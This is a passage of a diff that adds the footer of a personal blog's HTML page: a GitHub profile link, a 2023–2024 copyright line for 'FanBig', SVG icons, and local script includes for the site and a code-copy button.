+  
+  
+  
+  
+  
+    <a href="https://github.com/FanBigFan/" target="_blank" title="Github" class="flex flex-row mr-2">
+      <span class="hidden">Github</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+
+
+  </div>
+  <div class="grow"></div>
+  <div class="flex flex-row">
+    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
+</svg>
+</i> 2023 - 2024 FanBig
+    
+  </div>
+  
+</section>
+
+  </footer>
+  <script src="/main.js"></script>
+
+<div class="hidden top-1 right-1" id="code-copy">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
+  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
+</svg>
+
+  </i>
+</div>
+<div class="hidden top-1 right-1" id="code-copy-done">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M5 12l5 5l10 -10" />
+</svg>
+
+  </i>
+</div><script src="/code-copy.js"></script>
+
+
+
+
+
+</body>
+</html>
